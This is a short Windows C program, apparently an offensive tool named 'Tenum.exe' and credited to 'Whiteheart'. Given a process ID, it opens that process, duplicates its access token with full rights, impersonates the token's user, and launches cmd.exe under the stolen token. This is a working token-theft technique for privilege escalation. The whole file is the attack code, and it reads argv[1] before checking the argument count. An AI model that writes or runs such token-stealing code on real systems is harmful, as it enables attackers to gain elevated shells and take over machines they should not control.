#include<windows.h>
//#include <winbase.h>
#include<stdio.h>
//#define _WIN32_WINNT 0x0601
//#define _WIN32_WINNT_WS08 
//#define  	NTDDI_WIN7 



int main (int argc, LPCSTR argv[])
{
    DWORD pid = atoi (argv[1]); 
    if (argc != 2)
    {   printf ("==============================");
        printf ("\nUsage :: Tenum.exe <PID>\n");
        printf ("==============================\n");
        return 3;
    }
    printf("\n===Code Written By Whiteheart===\n");
    
    //opening Remote Process Token
    HANDLE rProcess2 = OpenProcess(PROCESS_QUERY_INFORMATION,TRUE,pid );
    if (!rProcess2)
    {
        printf ("\n+++++++++++++++++++++++++\nUnable to open process ID %d \n",pid);
        return 5;
    }
    printf ("\n+++++++++++++++++++++++++\nRemote Process is opened\n");

    // Opening Token of the process  to duplicate it 
    HANDLE pToken ; 
   // This is to get token retrieved from OpenProcessToken
    BOOL tResult = OpenProcessToken (rProcess2,TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_IMPERSONATE
                                        ,&pToken);
    if (!tResult)
    {
        printf ("\n+++++++++++++++++++++++++\nUnbale to open process token!!!\n"); 
        return 6;
    }
    printf("\n+++++++++++++++++++++++++\nProcess Token Opened Succesfully\nPid :: %d \n",pid);

    //These are required to call DuplicateTokenEx.
    SECURITY_IMPERSONATION_LEVEL seImpersonateLevel = SecurityImpersonation;
	TOKEN_TYPE tokenType = TokenPrimary;
	HANDLE pNewToken = new HANDLE;
    // Before calling CreatePrpcessWithTokenW function we need to impersonate loggon user 

    
   
    if (!DuplicateTokenEx(pToken,MAXIMUM_ALLOWED, NULL,seImpersonateLevel, tokenType,&pNewToken))
        {
            printf ("\n+++++++++++++++++++++++++\nUnable to Duplicate Token Error:: %d\n", GetLastError());
            return 7;
        }
    printf("\n+++++++++++++++++++++++++\nToken Is Duplicated Successfully!!!\n");

   BOOL bResult = ImpersonateLoggedOnUser(pNewToken);
   if (!bResult) printf ("\nUnbale To Impersonate User\n");

    STARTUPINFOA si = {};
    PROCESS_INFORMATION pi = {};
    //CreateProcessWithTokenW(pNewToken,LOGON_NETCREDENTIALS_ONLY,L"C:\\Windows\\System32\\cmd.exe",NULL,CREATE_NEW_CONSOLE,NULL,NULL,&si,&pi);
    if (!CreateProcessAsUserA(pNewToken,NULL,"C:\\Windows\\system32\\cmd.exe",NULL,NULL,TRUE,CREATE_NEW_CONSOLE,NULL,"c:\\windows\\system32",
                            &si,&pi))
    {
        printf ("\n UNABLE CREATE NEW PROCESS\n ERROR:: %d",GetLastError());
        return 9;
    }

 CloseHandle (rProcess2);
 CloseHandle(pNewToken);
 CloseHandle(pToken);
 return 0;
}

